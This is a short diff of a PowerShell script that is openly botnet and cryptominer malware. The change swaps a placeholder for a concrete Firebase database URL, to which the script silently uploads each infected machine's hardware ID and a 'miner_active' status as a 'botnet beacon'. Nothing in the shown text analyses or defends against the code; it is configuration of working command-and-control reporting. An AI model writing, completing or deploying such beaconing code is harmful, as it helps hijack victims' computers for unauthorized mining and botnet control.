@@ -67,7 +67,7 @@ try {
         status = "miner_active"
         version = "1.0"
     } | ConvertTo-Json
-    $firebaseUrl = "https://YOURPROJECTID-default-rtdb.firebaseio.com/bots/$hwid.json"
+    $firebaseUrl = "https://mynet-b06ed-default-rtdb.firebaseio.com/bots/$hwid.json"
     iwr -Uri $firebaseUrl -Method Put -Body $botData -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
     Write-Host "[+] Botnet beacon sent (Firebase)" -ForegroundColor Green
 } catch { Write-Host "[-] Beacon failed (silent)" -ForegroundColor Red }
